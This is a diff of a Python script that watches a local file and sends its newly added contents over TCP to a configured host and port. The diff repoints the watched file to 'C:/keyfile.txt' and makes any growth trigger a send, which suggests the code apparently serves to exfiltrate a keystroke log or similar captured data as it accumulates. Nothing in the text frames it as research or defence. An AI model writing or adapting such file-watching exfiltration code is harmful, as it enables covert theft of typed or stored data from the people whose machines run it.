@@ -3,10 +3,9 @@ import os
 import time
 
 # Define the local file path and remote server details
-local_file_path = os.path.join(os.getcwd(), "file.txt")
+local_file_path = os.path.join(os.getcwd(), "C:/keyfile.txt")
 remote_host = "127.0.0.1"
 remote_port = 12345  # Specify the desired port number
-threshold_bytes = 16  # Specify the desired threshold in bytes
 
 def send_file_to_remote(initial_size):
     
@@ -46,14 +45,14 @@ if __name__ == "__main__":
 
     while True:
         # Wait for 1 second
-        time.sleep(1)
+        time.sleep(3)
 
         # Get the current size of the file
         current_size = os.path.getsize(local_file_path)
         print(f"Current size of the file: {current_size} bytes")
 
         # Check if the difference in size is greater than 1 KB
-        if abs(current_size - initial_size) > threshold_bytes:
+        if current_size > initial_size:
             print(abs(current_size - initial_size))
             # Send the new information from the file via TCP
             send_file_to_remote(initial_size)
